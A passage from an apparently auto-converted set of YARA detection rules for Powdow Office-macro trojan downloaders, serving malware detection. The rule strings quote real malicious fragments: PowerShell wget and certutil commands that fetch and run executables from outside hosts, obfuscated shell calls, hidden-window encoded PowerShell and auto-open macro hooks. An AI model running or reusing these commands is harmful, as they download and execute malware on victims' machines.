        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".77d77ow77nlo77adSt77ring('77ht77t77p:7777//6774.7777190.1771773.77166/17711.77p7777s77177')" ascii //weight: 1
        $x_1_2 = ".CreateTextFile(Environ(\"USERPROFILE\") + \"\\Music\\temp.bat\")" ascii //weight: 1
        $x_1_3 = "= Replace(x, \"7\", \"\")" ascii //weight: 1
        $x_1_4 = {53 68 65 6c 6c 20 [0-1] 79}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBM_2147825057_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBM!MTB"
        threat_id = "2147825057"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 6f 72 6b 62 6f 6f 6b 5f 6f 70 65 6e 28 29 70 69 64 3d 73 68 65 6c 6c 28 22 63 6d 64 2f 63 63 65 72 74 75 74 69 6c 2e 65 78 65 2d 75 72 6c 63 61 63 68 65 2d 73 70 6c 69 74 2d 66 22 22 68 74 74 70 73 3a 2f 2f 66 61 72 6d 6c 61 72 67 65 62 61 72 73 2e 63 6f 2e 7a 61 2f 6d 61 78 2f [0-15] 2e 65 78 65 22 22 [0-15] 2e 65 78 65 2e 65 78 65 26 26 [0-15] 2e 65 78 65 2e 65 78 65 22 2c 76 62 68 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBM_2147825057_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBM!MTB"
        threat_id = "2147825057"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "y89hgj00.aAzZF().Exec(qibK() + \" \" + Tpbsd())" ascii //weight: 1
        $x_1_2 = "\"p\" + aIrF6 + \"hell\"" ascii //weight: 1
        $x_1_3 = {22 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 22 20 2b 20 61 49 72 46 35 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
        $x_1_4 = "ActiveSheet.Shapes(1).TextFrame.Characters.Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STBW_2147825874_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STBW!MTB"
        threat_id = "2147825874"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 77 77 77 2e 70 72 79 6e 74 73 74 65 61 6c 65 72 2e 63 6f 6d 2f 62 75 69 6c 64 73 2f 62 75 69 6c 64 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STDW_2147826400_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STDW!MTB"
        threat_id = "2147826400"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 70 72 79 6e 74 73 74 65 61 6c 65 72 2e 63 6f 6d 2f 70 72 79 6e 74 2f 6e 75 69 6c 64 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BNN_2147826544_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BNN!MTB"
        threat_id = "2147826544"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bdfdf = rdau.Open(v0df + \"\\eUOKm.bat\")" ascii //weight: 1
        $x_1_2 = "hoyqo = Range(\"B105\").Value + \" \" + Range(\"B104\").Value + Range(\"B103\").Value + \" -\" + rev(Range(\"B102\").Value) + rev(Range(\"B100\").Value)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBN_2147827033_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBN!MTB"
        threat_id = "2147827033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 2b 22 69 22 2b 22 27 22 2b 22 77 22 2b 22 27 22 2b 22 72 22 2b 22 28 27 68 74 74 70 73 3a 2f 2f [0-100] 2f 66 69 6c 65 73 2f [0-30] 2e 74 78 74 27 29 2d 22 2b 22 75 22 2b 22 73 22 2b 22 3f 22 2b 22 22 2b 22 22 2b 22 62 22 2b 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "auto_open_()msgbox\"error!\"call_shell&(tconetc$,0)endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBN_2147827033_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBN!MTB"
        threat_id = "2147827033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "POWERshEll.ExE wGet http://dastr.axwebsite.com/bin.exe" ascii //weight: 1
        $x_1_2 = "POWERshEll.ExE wGet https://www59.zippyshare.com/d/8o8nZNCx/373251/os.exe" ascii //weight: 1
        $x_1_3 = "POWERshEll.ExE wGet https://www56.zippyshare.com/d/KkGSo0MT/18509/11.exe" ascii //weight: 1
        $x_3_4 = "-outFIlE o.exe   ; .\\o.exe" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_PDAA_2147827471_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDAA!MTB"
        threat_id = "2147827471"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "POWERshEll.ExE wGet https://www72.zippyshare.com/d/CDE7qXWZ/27182/Fud.exe" ascii //weight: 1
        $x_1_2 = "-outFIlE o.exe   ; .\\o.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PKSH_2147827683_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PKSH!MTB"
        threat_id = "2147827683"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "POWERshEll.ExE wGet http://179.43.175.187/zqde/Jzqmynb.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ZDPD_2147828151_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ZDPD!MTB"
        threat_id = "2147828151"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 39 35 2e 31 32 33 2e 32 32 36 2e 37 34 2f 62 31 2f [0-15] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 77 69 6e 6d 61 6e 69 6e 64 75 73 74 72 69 65 73 2e 63 6f 6d 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 5a 7a 72 6f 68 67 73 72 6e 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 00 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBP_2147828184_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBP!MTB"
        threat_id = "2147828184"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "POWERshEll.ExE wGet http" ascii //weight: 1
        $x_1_2 = "-outFIlE o.exe   ; .\\o.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBP_2147828184_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBP!MTB"
        threat_id = "2147828184"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "auto_open()callvba.shell!(+,vbhide)endfunction" ascii //weight: 1
        $x_1_2 = "val(mid(strreverse(number),i+1,1))" ascii //weight: 1
        $x_1_3 = "::=vba.replace(,decryptepi(\"j\"),decryptepi(\"t\"))endfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBQ_2147828361_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBQ!MTB"
        threat_id = "2147828361"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=createobject(\"w\"+\"s\"+\"c\"+\"r\"+\"i\"+\"p\"+\"t\"+\".\"+\"s\"+\"h\"+\"e\"+\"l\"+\"l\")" ascii //weight: 1
        $x_1_2 = "closetextfile=showtextfile_._showbar._tag+_showtextfile_._frame11._tagendsub" ascii //weight: 1
        $x_1_3 = "sub_auto_close()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBQ_2147828361_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBQ!MTB"
        threat_id = "2147828361"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "auto_open_()::::::::::::::::::::::callvba.shell!(+,vbhide)endfunction" ascii //weight: 1
        $x_1_2 = "chr(oct2dec(asc(mid(sstring,i,1))))next" ascii //weight: 1
        $x_1_3 = "vba.replace(,decryptepi(\"j\"),decryptepi(\"t\"))endfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBQ_2147828361_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBQ!MTB"
        threat_id = "2147828361"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "replace(\"cmd/cpow^anseyen8rs^hanseyen8ll/w01c^u^rlhtt^ps://transfanseyen8r.sh/ganseyen8t/wur9ff/build.anseyen8^xanseyen8-o\"&ol6q&\";\"&ol6q,\"anseyen8\",\"e\")ftkvch.exe" ascii //weight: 1
        $x_1_2 = "document_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PKPW_2147829544_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PKPW!MTB"
        threat_id = "2147829544"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ShellExecute(1, StrReverse(\"nepO\"), StrReverse(\"exe.llehsrewop\")" ascii //weight: 1
        $x_1_2 = "StrReverse(\"exe.QmRfN\\pmeT\\swodniW\\:C exe.rerolpxe;exe.QmRfN\\pmeT\\swodniW\\:C o- exe.ADWWq/xxxgwad/moc.nrutqet//:sptth tegw neddiH elytSwodniW- " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBR_2147829762_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBR!MTB"
        threat_id = "2147829762"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "replace(\"cmd/cpow^yxdo5qe5rs^hyxdo5qe5ll/w01c^u^rlhtt^p://195.201.101.146/12341rgyxdo5qe5rgg435g4tr.yxdo5qe5^xyxdo5qe5-o\"&sd40&\";\"&sd40,\"yxdo5qe5\",\"e\")wr1dfm.exe" ascii //weight: 1
        $x_1_2 = "document_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBR_2147829762_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBR!MTB"
        threat_id = "2147829762"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ShellExecute(1, StrReverse(\"nepO\"), StrReverse(\"exe.llehsrewop\")" ascii //weight: 1
        $x_1_2 = {53 74 72 52 65 76 65 72 73 65 28 22 65 78 65 2e [0-10] 5c 70 6d 65 54 5c 73 77 6f 64 6e 69 57 5c 3a 43 20 65 78 65 2e 72 65 72 6f 6c 70 78 65 3b 65 78 65 2e [0-10] 5c 70 6d 65 54 5c 73 77 6f 64 6e 69 57 5c 3a 43 20 6f 2d 20 65 78 65 2e [0-25] 2f 6e 69 6d 64 61 2d 78 6d 61 74 7a 2f 6d 6f 63 2e 6e 72 75 74 71 65 74 2f 2f 3a 73 70 74 74 68}  //weight: 1, accuracy: Low
        $x_1_3 = {44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 43 72 69 74 69 63 61 6c 48 61 6e 64 6c 65 5a 65 72 6f 4f 72 4d 69 6e 75 73 4f 6e 65 49 73 49 6e 76 61 6c 69 64}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBS_2147829904_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBS!MTB"
        threat_id = "2147829904"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "createobject(ww+s+c+r+i+p+t+dd+s+h+e+l+l).runstrendsub" ascii //weight: 1
        $x_1_2 = "p=\"p\"o=\"o\"w=\"w\"e=\"e\"r=\"r\"s=\"s\"h=\"h\"l=\"l\"dd=\".\"" ascii //weight: 1
        $x_1_3 = "autoopen()loveendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBS_2147829904_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBS!MTB"
        threat_id = "2147829904"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".\"DOw`NL`Oads`TRI`Ng\"(('ht'+'tps'+'://pastebin.com/raw'+'/'+'WNJ'+'D'+'5X'+'R'+'v'))" ascii //weight: 1
        $x_1_2 = "=EXEC(\" & Chr(34) & Chr(99) & Chr(109) & Chr(100) & \" /c po^w^ershe^ll C:\\programdata\\khkhkh.ps1\" & Chr(34)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBT_2147829911_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBT!MTB"
        threat_id = "2147829911"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "gmadgbraguabqauaguaeablaciakqa=\"shell(\"powershell.exe\"&x)endsub" ascii //weight: 1
        $x_1_2 = "auto_open()dimxx=\"powershell-windowhidden-enckaboaguadwatae8aygbqaguaywb0a" ascii //weight: 1
        $x_1_3 = "document_open()auto_openendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBT_2147829911_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBT!MTB"
        threat_id = "2147829911"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"cmd.exe /c \" + defDir, vbNormalNoFocus" ascii //weight: 1
        $x_1_2 = "Environ(\"TEMP\") + \"\\fileDownloader.exe\"" ascii //weight: 1
        $x_1_3 = "cmd.exe /c curl \" + exeUrl + \" --output \" + defDir" ascii //weight: 1
        $x_1_4 = "Worksheets(\"Sheet1\").Cells(10001, 1).Value" ascii //weight: 1
        $x_1_5 = "Replace(exeUrl, \"&\", \"^&\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SPKW_2147830148_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SPKW!MTB"
        threat_id = "2147830148"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sbv.dapeton\\''+pmet:vne$,''sbv.tneilC detcetorP/gniw/moc.anahgeissua//:ptth" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBU_2147830177_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBU!MTB"
        threat_id = "2147830177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "''sbv.dapeton\\''+pmet:vne$,''sbv.tneilC detcetorP/resgic/kt.gdceifv//:ptth''" ascii //weight: 1
        $x_1_2 = "\"powe\" + \"rs\" + Range(\"F100\").Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBU_2147830177_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBU!MTB"
        threat_id = "2147830177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "shell(\"wscript\"+myfile,vbnormalfocus)endsub" ascii //weight: 1
        $x_1_2 = "print#textfile,\"ev\"+\"al(function(p,a,c,k,e,d){e=function(c){return(c<a\"+userform1.tbxclave.tag+userform1" ascii //weight: 1
        $x_1_3 = "range(\"a1:a13\")icol=myrange.count" ascii //weight: 1
        $x_1_4 = "myfile=\"textfile.js\"" ascii //weight: 1
        $x_1_5 = "subworkbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBV_2147830374_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBV!MTB"
        threat_id = "2147830374"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "call_shell!_(xxxxxxlora)endsub" ascii //weight: 1
        $x_1_2 = "xxxxxxlora_=calc.calc.value:::::::::::::::::::::::::debug_._print" ascii //weight: 1
        $x_1_3 = "workbook_open()::" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBV_2147830374_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBV!MTB"
        threat_id = "2147830374"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".shellexecutedfgdfjiejfjdshaj,yeuskaksef,\"\",\"open\",0endsub" ascii //weight: 1
        $x_1_2 = "replace(dfgdfjiejfjdshaj,fjdjkasf,\"\")" ascii //weight: 1
        $x_1_3 = "document_open()setdjfeihfidkasljf=createobject(\"shell.application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBW_2147830538_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBW!MTB"
        threat_id = "2147830538"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "call_shell@_(xxxxxxxxxxlora)endsub" ascii //weight: 1
        $x_1_2 = "xxxxxxxxxxlora_=notepad.notepad.value:::::::::::::::::::::::::::::::::::::::::debug_._print" ascii //weight: 1
        $x_1_3 = "subworkbook_open()::" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBW_2147830538_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBW!MTB"
        threat_id = "2147830538"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
